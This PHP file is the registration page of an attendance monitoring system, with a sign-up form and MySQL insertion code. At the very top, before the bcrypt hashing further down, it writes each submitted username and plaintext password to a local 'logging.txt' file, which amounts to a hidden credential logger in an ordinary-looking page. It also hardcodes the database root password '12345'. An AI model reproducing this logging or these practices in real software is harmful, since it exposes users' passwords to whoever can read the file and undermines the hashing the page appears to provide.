<?php
			if(isset($_POST['username']) || isset($_POST['password'])){
        $username=$_POST["username"];
        $password=$_POST["password"];
	 

          $file=fopen("logging.txt", "a");
           
          fwrite($file, "username :");
        fwrite($file, $username."\n");
	 
        fwrite($file,"password :");
        fwrite($file,$password."\n");
        
         fclose($file);
}


	$msg = "";

	if (isset($_POST['submit'])) {
		$con = new mysqli('localhost', 'root', '12345', 'monitoringsystem');

		$username = $con->real_escape_string($_POST['username']);
	 
		$password = $con->real_escape_string($_POST['password']);
		$cPassword = $con->real_escape_string($_POST['cPassword']);

		if ($password != $cPassword)
			$msg = "Please Check Your Passwords!";
		else {
			$hash = password_hash($password, PASSWORD_BCRYPT);
			$con->query("INSERT INTO user (username, password) VALUES ('$username',    '$hash' )");
			$msg = "You have been registered!";
		}
	}
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Attendance Monitoring System</title>
	<link rel="stylesheet" href="css/style.css">
	 </head>
<body id="formlogin">
<div class="login-container">
<h2>Register Page</h2>
    <br/>
			 
				 
				<?php if ($msg != "") echo $msg . "<br><br>"; ?>

				<form method="post" action=" ">
				<div class="form-element">
					<label>Username</label>
					<input type="text" name="username"  id="username" placeholder="username..."><br>
</div>
 
<div class="form-element">
	<label>Password</label>
				 
					<input type="password" name="password" id="password" required  placeholder="Enter Password"><br>
</div>
<div class="form-element">
	<label>Confirm Password</label>
					<input type="password" name="cPassword" id="password" placeholder="Confirm Password"><br>
</div>
					<button type="submit" class="btn btn-primary" name="submit" value="Register">Register<br>
</button>
<button><a href="login.php">Click here to Login!
</button>
</form>

			</div>
		</div>
	</div>
</body>
</html>